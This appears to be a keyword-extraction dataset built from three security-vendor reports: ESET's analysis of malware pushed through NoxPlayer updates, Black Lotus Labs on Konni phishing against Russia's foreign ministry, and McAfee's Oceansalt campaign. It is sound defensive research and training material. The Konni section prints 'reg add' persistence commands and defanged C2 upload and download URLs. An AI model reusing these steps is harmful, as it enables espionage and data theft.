NoxPlayer detects a newer version of the software, it will prompt the user with a message box (Figure 2) to offer the option to install it.Figure 2. NoxPlayer update promptThis is done by querying the update server via the BigNox HTTP API (api.bignox.com) in order to retrieve specific update information, as seen in Figure 3.Figure 3. NoxPlayer client update API requestThe response to this query contains update-specific information such as the update binary URL, its size, MD5 hash and other additional related information as seen in Figure 4.Figure 4. NoxPlayer server API replyUpon pressing the “Update now” button from Figure 1, the main NoxPlayer binary application Nox.exe will supply the update parameters received to another binary in its toolbox NoxPack.exe, which is in charge of downloading the update itself, as can be seen in Figure 5.Figure 5. NoxPlayer execution chain on updateAfter this is done, the progress bar in the message box will reflect the state of the download (Figure 6), and when completed the update has been performed.Figure 6. NoxPlayer update ongoing viaNoxPack.exeSupply-chain compromise indicatorsWe have sufficient evidence to state that the BigNox infrastructure (res06.bignox.com) was compromised to host malware, and also to suggest that their HTTP API infrastructure (api.bignox.com) could have been compromised. In some cases, additional payloads were downloaded by the BigNox updater from attacker-controlled servers. This suggests that the URL field, provided in the reply from the BigNox API, was tampered with by the attackers. The intrusion flow observed is depicted in Figure 7.Figure 7. Intrusion flow sequence diagramAn overview of what’s shown in the sequence diagram above is the following:1. On launch, the primary NoxPlayer executable Nox.exe will send a request via the API to query update information.2. The BigNox API server responds to the client request with specific update information, including the URL to download the update fromBigNox legitimate infrastructure.3. Nox.exe provides the appropriate parameters to NoxPlayer.exe to download the update.4. The legitimate update stored in BigNox infrastructure could have been replaced with malware, or it may be a new filename/URL not usedby legitimate updates.5. Malware is installed on the victim’s machine. Contrary to legitimate BigNox updates, the malicious files are not digitally signed, stronglysuggesting that the BigNox build system was not compromised, but just its systems that distribute updates.6. Some reconnaissance of the victim is performed and information sent to the malware operators.7. The perpetrators tailor malicious updates to specific victims of interest based on some unknown filtering scheme.8. Nox.exe will perform sporadic update requests.9. The BigNox API server responds to the client with update information, which states that the update is stored in the attacker-controlledinfrastructure.10. Further malware gets delivered to selected victims.With this information we can highlight several things:Legitimate BigNox infrastructure was delivering malware for specific updates. We observed that these malicious updates were only taking place in September 2020.Furthermore, we observed that for specific victims, malicious updates were downloaded from attacker-controlled infrastructure subsequently and throughout the end of 2020 and early 2021.We are highly confident that these additional updates were performed by Nox.exe supplying specific parameters to NoxPack.exe, suggesting that the BigNox API mechanism may have also been compromised to deliver tailored malicious updates.It could also suggest the possibility that victims were subjected to a MitM attack, although we believe this hypothesis is unlikely since the victims we discovered are in different countries, and attackers already had a foothold on the BigNox infrastructure.Furthermore, we were able to reproduce the download of the malware samples hosted on res06.bignox.com from a test machine and using https. This discards the possibility that a MitM attack was used to tamper the update binary.It is also important to mention that malicious updates downloaded from the attacker-controlled infrastructure mimicked the path of legitimate updates:Malicious update to attacker-controlled infrastructure: cloudfront.net.These indicators suggest that attackers were trying to avoid detection so that they could remain under the radar and achieve long-term persistence.MalwareA total of three different malicious update variants were observed, each of which dropped different malware. These variants are the following:Malicious Update variant 1This variant is one of the preliminary updates pointing to compromised BigNox infrastructure. Our analysis is based on the sample with SHA-1 CA4276033A7CBDCCDE26105DEC911B215A1CE5CF.The malware delivered does not seem to have been documented before. It is not extremely complex, but it has enough capabilities to monitor its victims. The initial RAR SFX archive drops two DLLs into C:\Program Files\Internet Explorer\ and runs one of them, depending on architecture, via rundll32.exe. The names of these DLLs are the following:ieproxysocket64.dllieproxysocket.dllIt also drops a text file named KB911911.LOG to disk, into which the original name of the SFX installer will be written. The DLL attempts to open and read this log file, and if not found will stop execution, therefore implementing an execution in an infinite loop until it changes. Otherwise, it will proceed to extract the UUID of the current machine via a WMI object query. This returned UUID is hashed using MD5 to serialize the current victim. Account name information will also be retrieved and saved.An encrypted configuration will be retrieved from the DLL’s resource. This configuration is encrypted using a two-byte XOR with 0x5000. The encrypted configuration is partially visible given the weakness of the key used:Figure 8. Encrypted configuration in resourcesThe format of this configuration is the following (roughly):OffsetSizeComment0x000x08Fake JPG header magic0x080x12CBuffer holding tokenized C&C information0x1340x14Buffer holding port for C&C communication0x1480x14Sleep time0x15C0x14Operate flag; don’t operate with network monitoring tools deployed or if this flag is set0x1700x14N/A0x1840x14DNS flag; append a token at the end of a hostname buffer with either |UDP or |DNS, depending on the value of this field0x1980x38Variable holding offset start of decoded configuration bufferAfter the configuration has been parsed, the backdoor will check several times for network monitoring processes before transferring execution to the C&C loop. Operation stops if the Operate flag is set or if either of the following processes is running:netman.exewireshark.exeThe backdoor can use either a raw IP address or a domain name to communicate with the C&C server. After successful connection to the C&C, the malware will be able to perform the following commands:Command IDSpecificationgetfilelist-deleteDelete specified files from the diskgetfilelist-runRun a command via the WinExec APIgetfilelist-uploadUpload a file via ScreenRDP.dll::ConnectRDServergetfilelist-downfile1Download a specific filegetfilelist-downfile2Download a specific directorygetfilelist-downfile3Same as getfilelist-downfile2<default>\\tsclient drive redirection of certain directories (starting with A: for range(0x1A))Figure 9. Anatomy of malicious update variant 1Malicious Update variant 2This malware variant was also spotted being downloaded from legitimate BigNox infrastructure. Our analysis is based on the sample with SHA-1 E45A5D9B03CFBE7EB2E90181756FDF0DD690C00C.It contains several files comprising what is known as a trident bundle, in which a signed executable is used to load a malicious DLL, which will decrypt and load a shellcode, implementing a reflective loader for the final payload.The theme for this trident bundle was to disguise the malware as Sandboxie components. The names of the bundled components are the following:FilenameDescriptionC:\ProgramData\Sandboxie\SandboxieBITS.exeSigned Sandboxie COM Services (BITS)C:\ProgramData\Sandboxie\SbieDll.dllMalicious hijacked DLLC:\ProgramData\Sandboxie\SbieIni.datMalicious encrypted payload; decrypts a reflectively loaded instance of Gh0st RATC:\Users\Administrator\AppData\Local\Temp\delself.batScript to self-delete the initial executableC:\Windows\System32\wmkawe_3636071.dataText file containing the sentence Stupid JapaneseWe have encountered other instances of this same text file, dropped by a very similar loader in a supply-chain compromise involving the Myanmar presidential office website in 2018, and in an intrusion into a Hong Kong university in 2020.The deployed final payload was a variant of Gh0st RAT with keylogger capabilities.Figure 10. Anatomy of malicious update variant 2Malicious Update variant 3This update variant was only spotted in activity subsequent to initial malicious updates, downloaded from attacker- controlled infrastructure. Our analysis is based on the sample with SHA-1 AA3D31A1A6FE6888E4B455DADDA4755A6D42BEEB.Similarly, as with the previous variant, this malicious update comes bundled in an MFC file, and extracts two components: a benign signed file and a dependency of it. The components are:FilenameDescriptionC:\ProgramData\LoGiTech\LoGitech.exeSigned Logitech binaryC:\ProgramData\LoGiTech\LBTServ.dllMalicious DLL decrypts and reflectively loads an instance of PoisonIvyOn the most recently discovered victims, the initial downloaded binary was written in Delphi, while for previous victims the same attacker-controlled URL dropped a binary written in C++. These binaries are the initial preliminary loaders. Although the loaders were written in different programming languages, both versions deployed the same final payload, that being an instance of the PoisonIvy RAT.Figure 11. Anatomy of malicious update variant 3ConclusionWe have detected various supply-chain attacks in the last year, such as Operation SignSight or the compromise of Able Desktop among others. However, the supply-chain compromise involved in Operation NightScout is particularly interesting due to the targeted vertical, as we rarely encounter many cyberespionage operations targeting online gamers.Supply-chain attacks will continue to be a common compromise vector leveraged by cyber-espionage groups, and its complexity may impact the discovery and mitigation of these type of incidents.For any inquiries, or to make sample submissions related to the subject, contact us at: threatintel@eset.com.AcknowledgementThe author would like to give special credit to Matthieu Faou for his support and feedback during the investigation.Indicators of Compromise (IoCs)FilesSHA-1ESET detection nameDecriptionCA4276033A7CBDCCDE26105DEC911B215A1CE5CFWin32/Agent.UOJMalicious Update variant 1E45A5D9B03CFBE7EB2E90181756FDF0DD690C00CWin32/GenKryptik.ENATMalicious Update variant 2AA3D31A1A6FE6888E4B455DADDA4755A6D42BEEBWin32/Kryptik.HHBQMalicious Update variant 35732126743640525680C1F9460E52D361ACF6BB0Win32/Delf.UODMalicious Update variant 3C&C servers210.209.72[.]180 103.255.177[.]138 185.239.226[.]172 45.158.32[.]65 cdn.cloudistcdn[.]com q.cloudistcdn[.]com Software Supply ChainMalware gets delivered via NoxPlayer updates.ExecutionT1053.005Scheduled Task/Job: Scheduled TaskMalicious update variant 3 instances will be executed via Scheduled task.ExecutionT1569.002System Services: Service ExecutionMalicious update variant 2 instances will be executed via service execution.PersistenceT1053.005Scheduled Task/Job: Scheduled TaskMalicious update variant 2 instances will create a scheduled task to establish persistence.Defense EvasionT1140Deobfuscate/Decode Files or InformationMalicious update variant 2 and 3 will be contained in ""trident"" bundles for evasion purposes.T1574.002Hijack Execution Flow: DLL Side-LoadingMalicious updates shipped as ""trident"" bundles will perform DLL side loading.CollectionT1056.001Input Capture:KeyloggingSome of the final payloads such as PoisonIvy and Gh0st RAT have keylogging capabilities.T1090.001Proxy: Internal ProxyThe PoisonIvy final payload variant has capabilities to authenticate with proxies.Command and ControlT1095Non-Application Layer ProtocolAll malicious update instances communicate over raw TCP or UDP.T1573Encrypted ChannelBoth PosionIvy and Gh0st RAT use encrypted TCP communication to avoid detection.ExfiltrationT1041Exfiltration Over C2 ChannelExfiltration in all malicious updates instances is done over a Command and Control channel.Ignacio Sanmillan1 Feb 2021 - 11:30AMNewsletterEmail Similar ArticlesSubmitCYBERCRIMEMALWAREMALWAREMALWAREEmotet botnet disrupted in global operationVadokrist: A wolf in sheep's clothingOperation Spalax: Targeted malware attacks in Colombia7 ways malware can get into your deviceDiscussionHomeAbout UsContact UsSitemapOur ExpertsESETResearchHow ToCategoriesRSS ConfiguratorNews Widget ","{'phrases': ['Compromise', 'place', 'legitimate updates', 'Malware', 'Noxplayer', 'info', 'BigNox API server', 'persistence', 'commands', 'RAT', 'data', 'C2 channel', 'Process', 'tailored malicious updates', 'selected victims'], 'target': 'Compromise; place; legitimate updates; Malware; Noxplayer; info; BigNox API server; persistence; commands; RAT; data; C2 channel; Process; tailored malicious updates; selected victims.'}"
access; stolen credentials; the MID; the threat actor; Covid-related lures; emails; Covid-related links; the files; a fake version; the Covid Vaccination Registration System; the files; malicious URLs; the victims; the malware; a first-stage agent; Malwarebytes; the threat actor; the compromised account; the MID network; espionage.,['1. October 2021 - Phishing campaign sends links to spoofed MID portal sites to harvest credentials 2. November 2021 - Malicious links lead to COVID-19 themed files impersonating Russian vaccine registration software 3. Malicious software installs a loader that retrieves malware from a command and control server 4. December 2021 - Threat actor compromises MID email account 5. Malicious emails sent from compromised account containing trojanized Happy New Year screensaver file 6. Screensaver displays holiday message and runs lightweight loader in background 7. Loader retrieves malware modules from command and control servers 8. Malware gathers system info and running tasks from infected machines 9. Malware attempts to download additional payloads from command and control servers 10. Malware provides persistent access to compromised machines for cyber espionage activities '],"Extract the keywords: New Konni Campaign Kicks Off the New Year by Targeting Russian Ministry of Foreign Affairsblog.lumen.com/new-konni-campaign-targeting-russian-ministry-of-foreign-affairs/January 5, 2022Black Lotus Labs Posted On January 5, 2022Executive Summary Black Lotus Labs, the threat research team of Lumen Technologies, uncovered a series of targeted actions against the Russian Federation’s Ministry of Foreign Affairs (MID). Based upon the totality of information available and the close correlation with prior reporting, we assess with moderate confidence these actions leveraged the Konni malware, which has previously been associated with the Democratic People’s Republic of Korea, and were undertaken to establish access to the MID network for the purpose of espionage. This activity cluster demonstrates the patient and persistent nature of advanced actors in waging multi-phased campaigns against perceived high-value networks. After gaining access through stolen credentials, the actor was able to exploit trusted connections to distribute and load the malware, first by impersonating a government software program coinciding with new Covid mandates, and then through sending trojanized files from a compromised account.1/10Introduction In October 2021, a presumed phishing campaign targeted the Russian Federation MID with links to a series of spoofed MID portals to harvest credentials from MID personnel. The actor then deployed Covid-related lures in November 2021 consisting of malicious URLs that downloaded files impersonating the Department of Health and Health Service. One of the files installed a fake version of the Russian-mandated vaccination registration software and served as a loader for additional malicious files. In December 2021, after successfully compromising the email account of a staff member of the MID, the threat actor targeted at least two other MID entities via emails from the compromised account: the Russian Embassy in Indonesia and a deputy minister overseeing non-proliferation and arms control, among other responsibilities. The emails propagated a “Happy New Year’s” message containing a trojanized screensaver attachment. These activity clusters are connected in a number of ways: First, the spoofed hostnames from the October cluster resolved to the same malicious IP that sent the targeted emails containing the screensaver. Second, the initially observed TTPs used in the November activity correlated to the December activity. Finally, the screensaver from the December activity downloaded a first-stage agent which is nearly identical to the agent previously reported by Malwarebytes.Technical DetailsFigure 1: Overview of Konni campaign against Russian Ministry of Foreign Affairs (MID)2/10October 2021: Phishing for Initial Access We assess the campaign began on or around October 19, 2021, with the initial goal of harvesting credentials. The Black Lotus Labs team discovered a series of spoofed hostnames impersonating MID portals that all resolved to the same single IP address: 152.89.247[.]26. One hostname, portal.newint-mid.ru.carnegieinsider[.]com, had a Let’s Encrypt X.509 certificate that was issued on October 19, 2021.Figure 2: Screenshot of the Let’s Encrypt X.509 certificate for a spoofed MID portal hostnameIn addition, we discovered two other spoofed hostnames resolving to the 152.89.247[.]26 IP address during mid-October. These additional hostnames referenced email services frequently used in Russia, such as Yandex and mail.ru: e.mail.ru.settings.pronto- login[.]com and passport.yandex.ru-settings.pronto-login[.]com.All the spoofed hostnames that resolved to this IP address used either the domain pronto- login[.]com or carnegieinsider[.]com.For a full list of spoofed hostnames, see the Indicators of Compromise section at the end of this report.November 2021: Covid Vaccination Registration Activity Based upon file metadata, we assess that the next cluster of activity occurred on approximately November 7, 2021. In this timeframe, the threat actor sent out malicious URL links that, if clicked, downloaded a file that was hosted on Yandex’s cloud service.3/10Figure 3: The malicious hyperlink to download the .zip fileThe downloaded .zip file (named oloo@mid.ru.zip) impersonated the “ОТДЕЛ ЛЕЧЕБНО- ОЗДОРОВИТЕЛЬНОГО ОБЕСПЕЧЕНИЯ,” which loosely translates to the “Department of Health and Health Services for the Russian Federation Ministry of Foreign Affairs.” This .zip file contained several benign PDFs and Word documents that asked the recipient to provide information regarding vaccination status and to sign a consent form. The timing of this activity closely aligned with the passage of Russian Vaccine Passport laws that mandated Russians had to receive a QR code from the government to prove vaccination in order to access public places such as restaurants and bars.4/10Figure 4: One of the files downloaded from Yandex cloud that discussed the vaccine mandateThe .zip file also contained an installer file called oloo@mid.ru/ПРОГРАММА ДЛЯ РЕГИСТРАЦИИ ПРИВИТЫХ В ФЕДЕРАЛЬНОМ РЕГИСТРЕ ВАКЦИНИРОВАННЫХ.exe which translates to “Program for Vaccination Registration in the Federal Registry.exe.” This installer impersonated a legitimate software the Russian people were directed to install in order to receive QR codes verifying their vaccination status. If invoked, this installer would also surreptitiously run a malicious loader file that attempted to retrieve a compressed file from the threat actor hostname victory- 2020.atwebpages[.]com. Unfortunately, we were not able to recover a copy of the first stage payload. However, the functionality for the Covid registration loader is nearly identical to that of the loader used in a December 2021 activity.5/10December 2021: Happy New Year’s Activity On December 20, 2021, we detected malicious emails being sent from a compromised MID account, mskhlystova@mid[.]ru. When we examined the email headers, we identified they were originating from the same IP address from the October phishing activity, 152.89.247[.]26. Copies of the malicious emails and their translations are below.Figure 5: Screenshot of two malicious emails sent by the threat actorFigure 6: English translation of the emailsAs of the time of this writing, we have identified two recipients of the emails, although we suspect there are more. The first was sent to the Russian Embassy in Indonesia: rusemb.indonesia@mid[.]ru . The second email was sent to Sergey Alexeyevich Ryabkov who was, according to a cached version of the MID website at the end of December 2021, responsible for “bilateral relations with North and South America, non-proliferation and arms control, Iran’s nuclear program and Russia’s participation in the BRICS association,” an international alliance comprised of Brazil, Russia, India, China and South Africa. [Note: The MID website link is no longer active.]If the malicious email was opened, it prompted the user to download and click the attached .zip file titled “поздравление”, which means “Congratulations.” Upon decompression, it revealed a screensaver file by the same name that, when clicked,6/10displayed a festive holiday screensaver wishing the recipient a Happy New Year while also surreptitiously running a light-weight loader to retrieve a file from the C2 node at hxxp://i758769.atwebpages[.]com.Figure 7: Benign Happy New Year’s screensaver that was displayed on the infected machineWhen we analyzed the network communications generated by the screensaver file, we noticed an interesting evasion technique. When the loader file reached out to the threat actor command and control node to obtain the first stage payload, the actor configured the server to respond with a code of “401 unauthorized.” Typically, a 401 error means the user making the request was not authorized to view the webpage and, in many cases, it results in the session being terminated. However, in this case, the website returned a malicious payload in the second part of the response. This was likely a tactic to avoid detection.Figure 8: Screenshot showing the C2 serving a 401 error code with the accompanying payload7/10The C2 node served the requesting machine a Microsoft Cabinet File (.cab). Once the .cab file was decompressed, it contained three more files: install.bat, scrnsvc.dll and scrnsvc.ini.Figure 9: Overview of the Happy New Year’s activityThese files were placed at the following location: %windir%/system32/. The install.bat file created a service called “ScreenSaver Management Service” that executed the malicious files on start. It then modified two registry keys on the infected machine.Reg add “HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SvcHost” /v scrnsvc /t REG_MULTI_SZ /d “scrnsvc” /f > nulreg add “HKLM\SYSTEM\CurrentControlSet\Services\scrnsvc\Parameters” /v ServiceDll /t REG_EXPAND_SZ /d “%windir%\System32\scrnsvc.dll” /f > nulIf the scrnsvc.dll and scrnsvc.ini files were already on the host machine, they were copied to the file path %windir%\System32. The .bat file then attempted to clean up some of the artifacts and launched the .dll file.The .dll file checked the infected machine for the presence of a .dat file at the following location: %windir%/system32/scrnsvc.dat. If no such file was found, it decrypted the contents of scrnsvc.ini which contained the threat actor hostname (url The .dll file then downloaded a file from url and saved it as %windir%/system32/scrnsvc.dat. Once decrypted, the scrnsvc.dat revealed the location of the second command and control server at hostname url the .dll file performed some basic host-based reconnaissance on the infected machine. It ran the systeminfo command from the command line of the infected machine to allow the threat actor to obtain information such as: hostname, OS name, OS version, domain, processor, BIOS version, etc. The .dll file then compressed the contents of the systeminfo command as a .cab file, encrypted it and uploaded it to the second threat actor-controlled hostname (hxxp://h378576.atwebpages[.]com/up.php? name=COMPUTER_NAME), which prompted a “success!” message as the response.Figure 10: Screen shot depicting “success!” messageNext, the.dll file obtained a list of all the running tasks, via tasklist, on the infected machine and repeated the same process of compressing, encrypting and subsequently uploading that file to the threat actor C2.The .dll file then attempted to download another payload from the second C2 h378576.atwebpages[.]com/dn.php?name={Host name}&prefix=cc (0). It entered a loop where the agent slept and attempted to reach back out to obtain the next payload at the URL h378576.atwebpages[.]com/dn.php?name={Host Name}&prefix=tt. Unfortunately, we were unable to recover a copy of the next payload. We suspect that the threat actor only served the next payload to a limited number of targeted machines based upon the contents of systeminfo and tasklist information that was uploaded to the C2.Based on the observed TTPs, including the use of a light-weight loader to retrieve a .cab file comprised of install.bat, the use of .dll to call an .ini file, the host-based commands and similar URL structures for the C2s, we observe strong correlation with the malware previously reported as Konni.Conclusion At Black Lotus Labs, we continue to track the use of Konni malware. While this particular campaign was highly targeted, it is vital for defenders to understand the evolving capabilities of advanced actors to achieve infection of coveted targets.9/10We advise our customers to perform full monitoring of network resources, use of multifactor authentication and reemphasizing the importance of phishing awareness to employees. These defensive measures that can help protect sensitive networks from this type of malicious activity.Black Lotus Labs blocked the threat actor infrastructure across the Lumen global IP network to protect customers and the wider internet ecosystem in the event that this actor re-uses the infrastructure in future campaigns. We also added these indicators to the Black Lotus Labs reputation system, which feeds Lumen’s security portfolio. We will continue to follow this activity to detect and disrupt similar campaigns, and we encourage other organizations to alert on these and similar indicators in their environments.For additional IoCs such as file hashes associated with this campaign, please visit our GitHub page.If you would like to collaborate on similar research, please contact us on Twitter @BlackLotusLabs.This analysis was performed by Danny Adamitis and Steve Rudd.This information is provided “as is” without any warranty or condition of any kind, either express or implied. Use of this information is at the end user’s own risk.Services not available everywhere. ©2021 Lumen Technologies. All Rights Reserved.10/10 ","{'phrases': ['October 2021', 'Phishing campaign', 'links', 'spoofed MID', 'credentials', 'November 2021', 'Covid', 'files', 'Russian', 'Reg', 'a loader', 'malware', 'command', 'control', 'December 2021', 'malicious emails', 'compromised account', 'Happy New Year', 'Screensaver', 'message', 'running tasks', '10', 'access', 'espionage'], 'target': 'October 2021; Phishing campaign; links; spoofed MID; credentials; November 2021; Covid; files; Russian; Reg; a loader; malware; command; control; December 2021; malicious emails; compromised account; Happy New Year; Screensaver; message; running tasks; 10; access; espionage.'}"
spear phishing emails; The emails; links; Microsoft Office; documents; the documents; South Korea; infrastructure; the document; the malware; components; the shellcode; server; commands; data; The attacker; the shellcode; the shellcode; the victim; the malware; system information; control; a control server; commands; the victim.,"['1. Spear phishing emails sent with weaponized Office documents containing macros. 2. Macros download Oceansalt malware implant from compromised servers. 3. Oceansalt executes and establishes command and control channel. 4. Initial reconnaissance of victim system sent to C2. 5. C2 server sends commands to perform additional reconnaissance. 6. Oceansalt can receive commands to execute commands, exfiltrate files, terminate processes. 7. Oceansalt sends data from victim system back to C2 server. 8. Reverse shell capability allows more extensive control over victim. ']","Extract the keywords: REPORT‘Operation Oceansalt’ Attacks South Korea, U.S., and Canada With Source Code From Chinese Hacker GroupOctober 18, 2018McAfee Advanced Threat ResearchREPORT‘Operation Oceansalt’ Attacks South Korea, U.S., and Canada With Source Code From Chinese Hacker GroupIntroduction McAfee® Advanced Threat Research and Anti-Malware Operations teams have discovered another unknown data reconnaissance implant targeting Korean-speaking users. We have named this threat Operation Oceansalt based on its similarity to the earlier malware Seasalt, which is related to earlier Chinese hacking operations. Oceansalt reuses a portion of code from the Seasalt implant (circa 2010) that is linked to the Chinese hacking group Comment Crew. Oceansalt appears to have been part of an operation targeting South Korea, United States, and Canada in a well-focused attack. A variation of this malware has been distributed from two compromised sites in South Korea. (They are currently offline.) Oceansalt appears to be the first stage of an advanced persistent threat. The malware can send system data to a control server and execute commands on infected machines, but we do not yet know its ultimate purpose. The Advanced Threat Research team has not previously described this implant in any of our analyses.AuthorsThis report was researched and written by:■ Ryan Sherstobitoff ■ Asheer MalhotraComment Crew or Another Actor? The actions of Comment Crew, also known as APT1, were exposed in 2013 in a ground-breaking report on Chinese cyber espionage against the United States. This report detailed the inner workings of Comment Crew and its cyber offensive capabilities. The consequences of releasing this public report forced the group to either make changes to their techniques or cease their activity altogether. Until this analysis, we had observed nonew activity related to Comment Crew since they were exposed, but now we find portions of their implant code appearing in new operations targeting South Korea.As we investigated this code overlap, we found no evidence that the source code from Comment Crew was ever made public, nor did we find it being sold in underground markets we examined. Has Comment Crew returned? We think it is unlikely. Due to the lack of indications that this is a new Comment Crew campaign, itConnect With Us2‘Operation Oceansalt’ Attacks South Korea, U.S., and Canada With Source Code From Chinese Hacker GroupREPORTraises the question of who is responsible. Based on our research, we offer a few potential scenarios that could explain the existence of Comment Crew’s code in the current actor’s malware targeting South Koreans.■ This is a code-sharing arrangement between twoactors■ An actor has privately gained access to the sourcecode from someone involved in the original Comment Crew operations■ This is a “false flag” operation using Comment Crew’s code to make it appear that China and North Korea have collaborated on this cyberattackDoes the Actor Speak Korean? The contents of the malicious documents were written in Korean and contained subjects specifically relating to the finances of projects in South Korea. These documents appear to be unique, not found on open-source channels. We were not able to determine the source of these documents, suggesting they were created by the actor.The metadata in the malicious Microsoft Office documents used in the attacks contains a Korean- language code page. This data indicates the document contained the Korean-language pack, most likely to ensure the victims could read it. We also see a consistent author, which is typical of the techniques of previous campaigns we have analyzed that involved malicious documents targeting South Koreans.Figure 1. Metadata from a code page in a malicious .xls document.The Advanced Threat Research team concludes that we have found a new implant family created by an actor targeting Korean-speaking users and using components from Comment Crew’s source code. Furthermore it is likely that the actor has a good working knowledge of the During our research we discovered the initial attack vector was spear phishing, with two malicious Korean- language Microsoft Excel documents acting as downloaders of this implant. According to our document analysis, the targets likely had knowledge of South Korean public infrastructure projects and related financials—a clear indication that the actor focused initially on infrastructure.A second round of malicious documents, this time in Microsoft Word, carried the same metadata and author as the Excel documents. The content was related to the financials of the Inter-Korean Cooperation Fund. The3‘Operation Oceansalt’ Attacks South Korea, U.S., and Canada With Source Code From Chinese Hacker GroupREPORTmalicious activity first appeared on May 31, 2018, in South Korea. Further telemetry indicates organizations outside of Korea have fallen victim to this attack; as of August 14, the attack had reached multiple industries in Canada and the United States.The date of the attack’s first appearance in North America is unknown. We did not find Office documents affecting targets in Canada and the United States, but our telemetry indicates the threat has also affected systems in North America. It is possible the attack on North American companies is part of a separate campaign from the one targeting Koreans, especially because we discovered only a handful of malicious documents and they distributed only one variant of the implant out of several we found. Based on our telemetry, the team learned these organizations were in the investment, banking, and agriculture industries. Objectives and Impact Our research suggests the targets were those who would read documents related to South Korea’s public construction expenses, Inter-Korean Cooperation fund, or other global financial data. One possible motive for the campaign is financial theft. These attacks might be a precursor to a much larger attack that could be devastating given the control the attackers have over their infected victims. The impact of these operations could be huge: Oceansalt gives the attackers full control of any system they manage to compromise and the network it is connected to. A bank’s network would be an especially lucrative target.Further, the code overlaps with that from a previously reported advanced state-sponsored group. The overlap suggests a close collaboration between members of a state-sponsored group and the current actors in conducting cyber operations. Campaign Analysis The campaign to target and compromise victims across the world began in Korea and expanded globally in stages. The distribution URLs for the implants were fairly consistent for the malicious documents; it appears the actor hacked a number of South Korean websites to host the implant code. Wave One: South Korean higher education The first wave of attacks began with a malicious document created May 18, with a last saved date of May 28. The author of this Korean-language document was Lion, whom we will continue to see throughout later documents.Figure 2. Metadata from a first-wave malicious document.4‘Operation Oceansalt’ Attacks South Korea, U.S., and Canada With Source Code From Chinese Hacker GroupREPORTIn the first wave the malicious Excel file contains a list of Korean names, physical addresses, and email addresses. Many of the names belong to those involved in higher education in South Korea or who attend various institutes. However, the list is random and looks like a copy of a database of personal information from a South Korean government authority.This document contains macro code to download the implant from www.[redacted].kr/admin/data/member/1/ log.php and execute it as V3UI.exe, the name of a security product in South Korea. Wave Two: South Korean public infrastructure The Advanced Threat Research team discovered that the implant was hosted at a legitimate site in South Korea belonging to a music teachers organization that has no relationship to the malicious document. The actor hosted a PHP page that triggered the download of the implant from a malicious VBA script embedded in two Excel documents, which contained Visual Basic macros to communicate, download, and install an implant on the victim’s system once the document was opened and viewed. The documents were submitted to us by a South Korean organization during the first wave of attacks.hxxp://[redacted].kr/admin/data/member/1/log.php Figure 3. The download URL for the second wave of attacks, against public infrastructure.This Excel document was created May 31 by the author Lion, a day before the implant was compiled and hosted on the distribution site. The documents appear to be related to South Korean public infrastructure projects and their expenses. Based on our analysis of the documents, it is clear that this attack is targeted toward South Korean individuals in this field.Figure 4. Metadata from a second-wave malicious document.5‘Operation Oceansalt’ Attacks South Korea, U.S., and Canada With Source Code From Chinese Hacker GroupREPORTFigure 5. Malicious document 1: investment trends in public infrastructure projects.6‘Operation Oceansalt’ Attacks South Korea, U.S., and Canada With Source Code From Chinese Hacker GroupREPORTFigure 6. Malicious document 2: expenses in public infrastructure projects.Figure 7. Malicious document 3: a public projects expense report.The last document in this wave was created by Lionon June 4 with the filename 0.온나라_상용_SW_2018년 대상_list_(20180411)_지역업체.xls. This document wasobserved downloading the implant from the distribution server. It references Onnara, a government agency responsible for land and development in South Korea.7‘Operation Oceansalt’ Attacks South Korea, U.S., and Canada With Source Code From Chinese Hacker GroupREPORTWave Three: Inter-Korean Cooperation The third wave included a Word document with the same type of macro code as the Excel files. The document contained fake information related to the financials of the Inter-Korean Cooperation Fund. The document was created at the same time as the attacks on South Korean public infrastructure officials. Lion authored both Excel and Word documents. This Word document used a different South Korean compromised website to distribute the implant. In this wave, an additional Excel document appeared with telephone numbers and contact information connected to the content of the Word document.hxxp://[redacted].kr/gbbs/bbs/admin/log.php Figure 8. The distribution URL for the implant for Wave Three.Figure 9. Fake statistics statement monthly report from the Inter-Korean Corporation Fund.8‘Operation Oceansalt’ Attacks South Korea, U.S., and Canada With Source Code From Chinese Hacker GroupREPORTFigure 10. Fake statistics statement monthly report from the Inter-Korean Corporation Fund.9‘Operation Oceansalt’ Attacks South Korea, U.S., and Canada With Source Code From Chinese Hacker GroupREPORTFigure 11. Fake product and partner information.10‘Operation Oceansalt’ Attacks South Korea, U.S., and Canada With Source Code From Chinese Hacker GroupREPORTWave Four: Targets outside of South Korea We identified a small number of targets outside of South Korea, as the attacks expanding their scope. We have yet to identify the malicious documents involved in delivering this implant to the victims. Because Waves One and Two contained different distribution servers for the implant, we expect this wave had its own as well. According to McAfee telemetry data between August 10 and 14, these North American targets fall within several industries:Wave Five: South Korea and United States The Oceansalt implant was not limited to just one sample. We discovered additional variants using different control servers. As we continued to investigate, we found more samples, though obfuscated to avoid detection. The samples were all identical to the initial Oceansalt implant. The fifth-wave samples were compiled between June 13 and July 17 and were submitted to us by organizations in South Korea and the United States.Industry Agriculture and Industrial United StatesFigure 12. Victims in Wave Four of the campaign.Hash 6/13/2018 6/14/2018 7/16/2018 7/16/2018 7/17/2018 7/17/2018 7/17/2018 7/17/2018 7/17/2018Control Server Download and execution capabilities ■ Once the .xls/.doc files are opened in Office,embedded malicious macros contact a download server and write the Oceansalt implant to disk■ These malicious macros execute the Oceansalt implanton the infected endpointThe indicators of compromise from the malicious .xls downloaders:IOC Description Download servers contactedOceansalt location on the download server Oceansalt location on the infected endpointIOC Value /admin/data/member/1/log[.]php /gbbs/bbs/admin/log[.]php %temp%\SynTPHelper[.]exe %temp%\LMworker[.]exeFigure 13. A portion of the malicious macro code used to download the implant.12‘Operation Oceansalt’ Attacks South Korea, U.S., and Canada With Source Code From Chinese Hacker GroupREPORTControl Server The campaign employed multiple control servers. We observed the following IP addresses in implants dating infections in Costa Rica, the United States, and the infections in the United States and Canada.These machines resided in numerous countries from August 18–21. Because this operation involves multifunction implants, these machines are likely to be part of a larger covert listener network. The Advanced Threat Research team has observed this kind of targeting in similar operations that compromise victims as control server relays. Implant Origins Our initial investigation into earlier similar samples led compiled in 2010. Oceansalt uses portions of code from this sample; their overall similarity is 21%. The reused code is unique, is not considered a common library or common code, and serves reconnaissance and control.The misclassified sample used a Comment Crew domain. Further investigation revealed the misclassified sample is 99% like Seasalt Crew implant reported to have been used in their operations around 2010. Thus the Oceansalt actor is reusing portions of code from Seasalt to form a new implant. Based on the overall techniques, Oceansalt is unlikely to signal a rebirth of Comment Crew, raising the question of how the actor obtained the Seasalt code. Was it provided to this or another actor, or was it leaked and discovered by this actor? We have been unable to find any evidence in underground or public forums that suggest the source code of Seasalt has been leaked or made available.We discovered another batch of samples compiled on 